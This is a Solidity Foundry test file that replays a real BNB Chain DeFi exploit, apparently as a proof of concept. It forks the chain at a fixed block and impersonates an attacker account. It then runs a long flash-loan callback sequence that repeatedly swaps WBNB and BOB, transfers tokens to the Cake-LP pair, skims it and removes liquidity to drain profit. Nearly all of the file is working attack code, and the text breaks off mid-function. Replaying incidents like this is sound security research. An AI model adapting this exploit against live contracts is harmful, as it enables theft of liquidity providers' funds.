
pragma solidity ^0.8.20;

import {Base, IERC20Like} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 34428627;
    uint256 constant TX_TIMESTAMP = 1702803679;
    uint256 constant TX_BLOCK_NUMBER = 34428628;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.CAKE_LP, "Cake-LP", 16543552003957242);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "BNB", 3003791664134545218);
    }
}

contract OurAttack {
    function attack() external payable {
        _executeDodoBorrow();
    }

    function flashCallback() internal {
        replayedCallback1 = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
        flashCallback49();
        flashCallback50();
        flashCallback51();
        flashCallback52();
        flashCallback53();
        flashCallback54();
        flashCallback55();
        flashCallback56();
        flashCallback57();
        flashCallback58();
        flashCallback59();
        flashCallback60();
        flashCallback61();
        flashCallback62();
        flashCallback63();
        flashCallback64();
        flashCallback65();
        flashCallback66();
        flashCallback67();
        flashCallback68();
        flashCallback69();
        flashCallback70();
        flashCallback71();
        flashCallback72();
        flashCallback73();
        flashCallback74();
        flashCallback75();
        flashCallback76();
        flashCallback77();
        flashCallback78();
        flashCallback79();
        flashCallback80();
        flashCallback81();
        flashCallback82();
        flashCallback83();
        flashCallback84();
        flashCallback85();
        flashCallback86();
        flashCallback87();
        flashCallback88();
        flashCallback89();
        flashCallback90();
        flashCallback91();
        flashCallback92();
        flashCallback93();
        flashCallback94();
        flashCallback95();
        flashCallback96();
        flashCallback97();
        flashCallback98();
        flashCallback99();
        flashCallback100();
        flashCallback101();
        flashCallback102();
        flashCallback103();
        flashCallback104();
        flashCallback105();
        flashCallback106();
        flashCallback107();
        flashCallback108();
        flashCallback109();
        flashCallback110();
        flashCallback111();
        flashCallback112();
        flashCallback113();
        flashCallback114();
        flashCallback115();
        flashCallback116();
        flashCallback117();
        flashCallback118();
        flashCallback119();
        flashCallback120();
        flashCallback121();
        flashCallback122();
        flashCallback123();
        flashCallback124();
        flashCallback125();
        flashCallback126();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.CAKE_LP).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
    }

    function flashCallback5() internal {
        {
            uint256 swapAmountIn = 20000000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback6() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback7() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .quote(4378947535127443741765606, 667938195508631522292091237333, 3043072444337947721);
    }

    function flashCallback8() internal {
        {
            uint256 wbnbTransferAmount = 19950131118344;
            IERC20Like(Addresses.WBNB).transfer(Addresses.CAKE_LP, wbnbTransferAmount);
        }
    }

    function flashCallback9() internal {
        {
            uint256 bobTransferAmount = 4378947535127443741765606;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobTransferAmount);
        }
    }

    function flashCallback10() internal {
        ICake_LP(Addresses.CAKE_LP).mint(address(this));
    }

    function flashCallback11() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback12() internal {
        {
            uint256 swapAmountIn = 99999960049868881656;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback13() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback14() internal {
        {
            uint256 bobPairAmount = 648168630381583967415706898951;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount);
        }
    }

    function flashCallback15() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback16() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback17() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(604450249950901424100722373354, 19773812706156628496813851020, 103043052444337947721);
    }

    function flashCallback18() internal {
        {
            uint256 cakeLpSwapAmount = 99770992561631968151;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount, address(this), hex"00");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback19() internal {
        _buyExactBob(583351767343425570674136209055, 99770992561631968151);
    }

    function flashCallback20() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback21() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback22() internal {
        {
            uint256 swapAmountIn = 1149203045811631892752325180083;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback23() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback24() internal {
        {
            uint256 swapAmountIn = 101260130551117773810;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback25() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback26() internal {
        {
            uint256 bobPairAmount2 = 1140873096454864241612529563056;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount2);
        }
    }

    function flashCallback27() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback28() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback29() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(1049841822302023460429593533770, 20137735110226006347597531797, 103043021056968283457);
    }

    function flashCallback30() internal {
        {
            uint256 cakeLpSwapAmount2 = 101098913281528318617;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount2, address(this), hex"00");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback31() internal {
        _buyExactBob(1026785786809377817451276606750, 101098913281528318617);
    }

    function flashCallback32() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback33() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback34() internal {
        {
            uint256 swapAmountIn = 2022768092129387464262640909095;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback35() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback36() internal {
        {
            uint256 swapAmountIn = 101990098827019189752;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback37() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback38() internal {
        {
            uint256 bobPairAmount3 = 2008101751509449469576258181952;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount3);
        }
    }

    function flashCallback39() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback40() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback41() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(1833797408493780634587149477446, 20782695852447155103979382273, 103042998725783762096);
    }

    function flashCallback42() internal {
        {
            uint256 cakeLpSwapAmount3 = 101885422302514805883;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount3, address(this), hex"00");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback43() internal {
        _buyExactBob(1807291576358504522618632363756, 101885422302514805883);
    }

    function flashCallback44() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback45() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback46() internal {
        {
            uint256 swapAmountIn = 3560364546458965145649229615376;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback47() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback48() internal {
        {
            uint256 swapAmountIn = 102418250623713397794;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback49() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback50() internal {
        {
            uint256 bobPairAmount4 = 3534851589696946294407495099640;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount4);
        }
    }

    function flashCallback51() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback52() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback53() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(3213655552332558292229172701657, 21616006267224785997376091641, 103042983744031276365);
    }

    function flashCallback54() internal {
        {
            uint256 cakeLpSwapAmount4 = 102352802795832399813;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount4, address(this), hex"00");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback55() internal {
        _buyExactBob(3181366430727251664966745589676, 102352802795832399813);
    }

    function flashCallback56() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback57() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback58() internal {
        {
            uint256 swapAmountIn = 6267292094698088816796113632999;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback59() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback60() internal {
        {
            uint256 swapAmountIn = 102671253176226580537;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback61() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback62() internal {
        {
            uint256 bobPairAmount5 = 6222878276644763276378588899498;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount5);
        }
    }

    function flashCallback63() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback64() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback65() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(5642584845300957520285530032094, 22586376693439650219479487893, 103042974117564583542);
    }

    function flashCallback66() internal {
        {
            uint256 cakeLpSwapAmount5 = 102631128292410632227;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount5, address(this), hex"00");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback67() internal {
        _buyExactBob(5600590448980286948740730009548, 102631128292410632227);
    }

    function flashCallback68() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback69() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback70() internal {
        {
            uint256 swapAmountIn = 11033163558810842271808837319528;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback71() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback72() internal {
        {
            uint256 swapAmountIn = 102821422588585760294;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback73() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback74() internal {
        {
            uint256 bobPairAmount6 = 10955605758841235371605557068444;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount6);
        }
    }

    function flashCallback75() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback76() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback77() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(9918522489501333259468027358334, 23664801403503784135526519232, 103042968113100634546);
    }

    function flashCallback78() internal {
        {
            uint256 cakeLpSwapAmount6 = 102797087782256492192;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount6, address(this), hex"00");
        }
    }

    function flashCallback79() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback80() internal {
        _buyExactBob(9860045182957111834445001361599, 102797087782256492192);
    }

    function flashCallback81() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback82() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback83() internal {
        {
            uint256 swapAmountIn = 19424289642819889582420132940593;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback84() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback85() internal {
        {
            uint256 swapAmountIn = 102910792193958104979;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback86() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback87() internal {
        {
            uint256 bobPairAmount7 = 19288474699985916195085392039063;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount7);
        }
    }

    function flashCallback88() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
    }

    function flashCallback89() internal {
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback90() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback91() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(17446426420506105883605103739245, 24835009477111747466137692158, 103042964439967132515);
    }

    function flashCallback92() internal {
        {
            uint256 cakeLpSwapAmount7 = 102896124580366104623;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount7, address(this), hex"00");
        }
    }

    function flashCallback93() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback94() internal {
        _buyExactBob(17359627229987324575576852835156, 102896124580366104623);
    }

    function flashCallback95() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback96() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback97() internal {
        {
            uint256 swapAmountIn = 34198466725423358265324910296320;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback98() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback99() internal {
        {
            uint256 swapAmountIn = 102964062594666514147;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback100() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback101() internal {
        {
            uint256 bobPairAmount8 = 33960157481846322249898016385503;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount8);
        }
    }

    function flashCallback102() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
    }

    function flashCallback103() internal {
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback104() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback105() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(30700032472103693026733916458939, 26088317105475631252119360942, 103042962220473061898);
    }

    function flashCallback106() internal {
        {
            uint256 cakeLpSwapAmount8 = 102955253487412808848;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount8, address(this), hex"00");
        }
    }

    function flashCallback107() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback108() internal {
        _buyExactBob(30564141733661690024908214746952, 102955253487412808848);
    }

    function flashCallback109() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback110() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback111() internal {
        {
            uint256 swapAmountIn = 60211361082671562107248502439403;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.BOB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.BOB, Addresses.WBNB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback112() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback113() internal {
        {
            uint256 swapAmountIn = 102995845446311977958;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
                }
                IPancakeRouter(Addresses.PANCAKE_ROUTER)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BOB),
                        address(this),
                        1702803679
                    );
            }
        }
    }

    function flashCallback114() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback115() internal {
        {
            uint256 bobPairAmount9 = 59792657361199924517357988484691;
            IERC20Like(Addresses.BOB).transfer(Addresses.CAKE_LP, bobPairAmount9);
        }
    }

    function flashCallback116() internal {
        ICake_LP(Addresses.CAKE_LP).skim(Addresses.CAKE_LP);
    }

    function flashCallback117() internal {
        ICake_LP(Addresses.CAKE_LP).getReserves();
    }

    function flashCallback118() internal {
        IERC20Like(Addresses.BOB).balanceOf(Addresses.CAKE_LP);
    }

    function flashCallback119() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .getAmountOut(54034878729945610904521639023852, 27420699207002380494575951266, 103042960889522542200);
    }

    function flashCallback120() internal {
        {
            uint256 cakeLpSwapAmount9 = 102990566005400260436;
            IUniswapV2PairLike(Addresses.CAKE_LP).swap(0, cakeLpSwapAmount9, address(this), hex"00");
        }
    }

    function flashCallback121() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function flashCallback122() internal {
        _buyExactBob(53813391625079932065622189636221, 102990566005400260436);
    }

    function flashCallback123() internal {
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.BOB, 1000000000000000000, 1, 1, address(this), 1702803679
            );
    }

    function flashCallback124() internal {
        IERC20Like(Addresses.BOB).balanceOf(address(this));
    }

    function flashCallback125() internal {
        {
            uint256 swapAmountIn = 106012384738920415842111931926637;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.BOB).allowance(address(this), Addresses.PANCAKE_ROUTER)
                        < swapAmountIn
                ) {
